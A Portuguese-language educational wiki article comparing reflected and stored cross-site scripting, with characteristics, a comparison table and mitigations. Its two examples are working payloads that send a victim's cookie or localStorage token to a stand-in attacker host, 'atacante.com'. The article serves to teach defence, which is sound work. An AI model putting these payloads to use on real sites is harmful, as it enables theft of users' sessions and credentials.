---
reviewed_at: 2026-04-07
title: XSS Refletido vs Armazenado: Entendendo as Diferenças
topic: cybersecurity
tags: [xss, web-security, vulnerability, injection]
source: qa
---

# XSS Refletido vs Armazenado: Entendendo as Diferenças

Cross-Site Scripting (XSS) é uma das vulnerabilidades mais comuns em [[aplicacoes-web]], permitindo a [[injection|injecao]] de scripts maliciosos em páginas visualizadas por usuários. Embora existam diferentes variantes, as duas formas mais críticas são o **XSS Refletido** e o **XSS Armazenado**, que se distinguem fundamentalmente pela persistência do [[payload]] malicioso e pelo vetor de ataque necessário.

## XSS Refletido (Reflected XSS)

No ataque XSS Refletido, o código malicioso é enviado ao [[servidor]] através de parâmetros [[URL]], formulários ou cabeçalhos [[HTTP]], sendo "refletido" imediatamente na resposta da página **sem persistência em banco de dados** ou armazenamento permanente.

### Características principais:
- **Execução imediata**: O script é processado e retornado na mesma requisição/resposta
- **Dependência de [[engenharia-social]]**: O atacante deve induzir a vítima a clicar em um link manipulado ou enviar dados específicos
- **Alcance limitado**: Afeta apenas usuários que acessarem o link malicioso específico
- **Vetores comuns**: Parâmetros de busca, mensagens de erro dinâmicas, campos de formulário GET

### Exemplo prático:
Um atacante cria um link como `https://site.com/busca?q=<script>document.location='https://atacante.com/roubar?cookie='+document.cookie</script>` e o envia por e-mail. Quando a vítima clica, o servidor retorna a página com o script executando no [[navegador]].

## XSS Armazenado (Stored XSS)

O XSS Armazenado representa uma ameaça mais severa, pois o payload malicioso é **persistido permanentemente** no [[banco-de-dados]] ou sistema de arquivos do servidor, sendo executado automaticamente sempre que usuários acessarem a página contaminada.

### Características principais:
- **Persistência**: O código é salvo em comentários, posts de fórum, perfis de usuário, descrições de produtos ou qualquer campo armazenado
- **Alcance massivo**: Afeta todos os usuários que visualizarem o conteúdo comprometido
- **Sem interação específica**: A vítima não precisa clicar em links suspeitos, apenas acessar a página normalmente
- **Difícil detecção**: Pode permanecer ativo por longos períodos antes de ser identificado

### Exemplo prático:
Um atacante insere `<script>fetch('https://atacante.com/log?d='+localStorage.getItem('token'))</script>` em um comentário de blog. Todos os visitantes futuros que carregarem a página executarão o script, enviando seus tokens de [[autenticacao]] para o servidor do atacante.

## Comparativo: Refletido vs Armazenado

| Aspecto | XSS Refletido | XSS Armazenado |
|---------|---------------|----------------|
| **Persistência** | Temporária (uma requisição) | Permanente (até remoção manual) |
| **Vetor de ataque** | Requer clique em link específico | Execução automática na visualização |
| **Alcance** | Individual (targeted) | Massivo (todos os visitantes) |
| **Complexidade** | Requer [[engenharia-social]] | Requer bypass de filtros de entrada |
| **Detecção** | Mais difícil (não deixa rastros no servidor) | Mais fácil (payload visível no DB) |
| **Impacto típico** | Roubo de [[session-hijacking|sessao]] de um usuário | Comprometimento em larga escala |

## Mitigação

Ambos os tipos compartilham estratégias de prevenção fundamentais:
- **[[input-sanitization|Sanitizacao]] rigorosa** de entradas de usuário
- **[[output-encoding|Codificacao de saida]]** (output encoding) apropriada ao contexto (HTML, JavaScript, URL, CSS)
- Implementação de **[[content-security-policy|Content Security Policy (CSP)]]**
- Uso de headers de segurança como `X-XSS-Protection` (em conjunto com outras medidas)
- [[frameworks|Frameworks]] modernos que aplicam [[input-validation]] e escaping automático

## Conceitos Relacionados
- [[xss-(cross-site-scripting)]]
- [[engenharia-social]]
- [[banco-de-dados]]
- [[url]]
- [[http]]
- [[payload]]
- [[input-validation]]
- [[content-security-policy]]
- [[aplicacoes-web]]
- [[navegador]]
- [[servidor]]
- [[session-hijacking]]
- [[autenticacao]]
- [[injection]]
- [[input-sanitization]]
- [[output-encoding]]
- [[frameworks]]

<!-- Sugestões de novos artigos:
[[xss-baseado-em-dom]] - O artigo menciona "diferentes variantes" mas aborda apenas Refletido e Armazenado, faltando a terceira categoria principal (DOM-based XSS) que também é crítica
[[web-storage-security]] - O artigo menciona localStorage como vetor de roubo de tokens; um artigo dedicado à segurança de Web Storage (localStorage, sessionStorage, IndexedDB) e boas práticas de armazenamento client-side seria complementar
-->